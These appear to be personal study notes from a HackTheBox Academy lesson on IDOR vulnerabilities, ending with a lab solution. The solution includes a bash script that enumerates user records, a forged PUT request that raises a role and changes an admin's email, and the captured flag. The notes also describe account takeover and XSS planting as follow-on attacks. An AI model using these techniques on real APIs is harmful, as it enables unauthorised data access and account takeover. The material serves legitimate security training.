Usually, a`GET` request to the API endpoint should return the details of the requested user, so we may try calling it to see if we can retrieve our user's details. We also notice that after the page loads, it fetches the user details with a`GET` request to the same API endpoint: ![get_api](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_api.jpg)

As mentioned in the previous section, the only form of authorization in our HTTP requests is the`role=employee` cookie, as the HTTP request does not contain any other form of user-specific authorization, like a JWT token, for example. Even if a token did exist, unless it was being actively compared to the requested object details by a back-end access control system, we may still be able to retrieve other users' details.

---

## Information Disclosure

Let's send a`GET` request with another`uid`:

![get_another_user](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_another_user.jpg)

As we can see, this returned the details of another user, with their own`uuid` and`role`, confirming an`IDOR Information Disclosure vulnerability`:


```json
{
 "uid": "2",
 "uuid": "4a9bd19b3b8676199592a346051f950c",
 "role": "employee",
 "full_name": "Iona Franklyn",
 "email": "i_franklyn@employees.htb",
 "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

This provides us with new details, most notably the`uuid`, which we could not calculate before, and thus could not change other users' details.

---

## Modifying Other Users' Details

Now, with the user's`uuid` at hand, we can change this user's details by sending a`PUT` request to`/profile/api.php/profile/2` with the above details along with any modifications we made, as follows:

![modify_another_user](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_another_user.jpg)

We don't get any access control error messages this time, and when we try to`GET` the user details again, we see that we did indeed update their details:

![new_another_user_details](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_new_another_user_details.jpg)

In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is`modifying a user's email address` and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. Another potential attack is`placing an XSS payload in the 'about' field`, which would get executed once the user visits their`Edit profile` page, enabling us to attack the user in different ways.

---

## Chaining Two IDOR Vulnerabilities

Since we have identified an IDOR Information Disclosure vulnerability, we may also enumerate all users and look for other`roles`, ideally an admin role.`Try to write a script to enumerate all users, similarly to what we did previously`.

Once we enumerate all users, we will find an admin user with the following details:


```json
{
 "uid": "X",
 "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
 "role": "web_admin",
 "full_name": "administrator",
 "email": "webadmin@employees.htb",
 "about": "HTB{FLAG}"
}
```

We may modify the admin's details and then perform one of the above attacks to take over their account. However, as we now know the admin role name (`web_admin`), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the`Update profile` button and change our role to`web_admin`:

![modify_our_role](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_our_role.jpg)

This time, we do not get the`Invalid role` error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we`GET` our user details, we see that our`role` has indeed been set to`web_admin`:

```json
{
 "uid": "1",
 "uuid": "40f5888b67c748df7efba008e7c2f9d2",
 "role": "web_admin",
 "full_name": "Amy Lindon",
 "email": "a_lindon@employees.htb",
 "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Now, we can refresh the page to update our cookie, or manually set it as`Cookie: role=web_admin`, and then intercept the`Update` request to create a new user and see if we'd be allowed to do so:

![create_new_user_2](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_2.jpg)

We did not get an error message this time. If we send a`GET` request for the new user, we see that it has been successfully created:

![create_new_user_2](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_new_user.jpg)

By combining the information we gained from the`IDOR Information Disclosure vulnerability` with an`IDOR Insecure Function Calls` attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.

With our new`role`, we may also perform mass assignments to change specific fields for all users, like placing XSS payloads in their profiles or changing their email to an email we specify.`Try to write a script that changes all users' email to an email you choose.`. You may do so by retrieving their`uuids` and then sending a`PUT` request for each with the new email.

# Question
---
![Pasted image 20250217165333.png](../../../../IMAGES/Pasted%20image%2020250217165333.png)

We can use this script to enumerate users:

```bash
#!/bin/bash

target_url="http://SERVER_IP:PORT/profile/api.php/profile"

# Color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}[*] Enumerating users 1-10...${NC}"
echo "----------------------------------------"

for uid in {1..10}; do
 response=$(curl -s "${target_url}/${uid}")
 
 if echo "$response" | grep -q "uuid"; then
 uuid=$(echo "$response" | jq -r '.uuid')
 role=$(echo "$response" | jq -r '.role')
 email=$(echo "$response" | jq -r '.email')
 full_name=$(echo "$response" | jq -r '.full_name')

 # Check for admin role
 if [ "$role" = "web_admin" ]; then
 echo -e "${RED}[!] ADMIN USER FOUND:${NC}"
 echo -e "${RED}UID: $uid"
 echo -e "UUID: $uuid"
 echo -e "Role: $role"
 echo -e "Name: $full_name"
 echo -e "Email: $email${NC}"
 else
 echo -e "${GREEN}[+] User $uid:${NC}"
 echo "UUID: $uuid"
 echo "Role: $role"
 echo "Name: $full_name"
 echo "Email: $email"
 fi
 echo "----------------------------------------"
 else
 echo -e "[-] User $uid not found or access denied"
 fi
done
```

We'll see the following output:

```
[*] Enumerating users 1-10...
----------------------------------------
[+] User 1:
UUID: 40f5888b67c748df7efba008e7c2f9d2
Role: employee
Name: Amy Lindon
Email: a_lindon@employees.htb
----------------------------------------
[+] User 2:
UUID: 4a9bd19b3b8676199592a346051f950c
Role: employee
Name: Iona Franklyn
Email: i_franklyn@employees.htb
----------------------------------------
[+] User 3:
UUID: 771409a8fb1543788fe7d91f1ea0987f
Role: employee
Name: Ardith Bloxham
Email: a_bloxham@employees.htb
----------------------------------------
[+] User 4:
UUID: 1a1f289428bd7ab3beb8a89d4c90b22f
Role: employee
Name: Lela Symons
Email: l_symons@employees.htb
----------------------------------------
[+] User 5:
UUID: eb4fe264c10eb7a528b047aa983a4829
Role: employee
Name: Callahan Woodhams
Email: c_woodhams@employees.htb
----------------------------------------
[+] User 6:
UUID: cb67c3ae286e9140355eb56d2c33ff5b
Role: employee
Name: Roscoe Alden
Email: r_alden@employees.htb
----------------------------------------
[+] User 7:
UUID: 63d9b90d9808e4ddc24c2331ddd6775d
Role: employee
Name: Marsha Pierce
Email: m_pierce@employees.htb
----------------------------------------
[+] User 8:
UUID: deb77b7fcd6ee6af0b2c992355eaeea9
Role: employee
Name: George Fleming
Email: g_fleming@employees.htb
----------------------------------------
[+] User 9:
UUID: ca7724498403de38829ae36fc9149b75
Role: employee
Name: Augusta Edwardson
Email: a_edwardson@employees.htb
----------------------------------------
[+] User 10:
UUID: bfd92386a1b48076792e68b596846499
Role: staff_admin
Name: admin
Email: admin@employees.htb
----------------------------------------
```

We found that the `uid=10` equals to the admin user, now, we can proceed to change the email to:

```
flag@idor.htb
```

We can do it by modifying the request in the following way:

```http
PUT /profile/api.php/profile/10 HTTP/1.1

Host: 94.237.50.156:34303

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://94.237.50.156:34303/profile/index.php

Content-type: application/json

Content-Length: 198

Origin: http://94.237.50.156:34303

Connection: keep-alive

Cookie: role=staff_admin

Priority: u=0



{"uid":10,"uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}
```

If we check the response, we get this:


![Pasted image 20250217165646.png](../../../../IMAGES/Pasted%20image%2020250217165646.png)

Now, if we check our edit profile:

![Pasted image 20250217165720.png](../../../../IMAGES/Pasted%20image%2020250217165720.png)

We got our flag:

```
HTB{1_4m_4n_1d0r_m4573r}
```
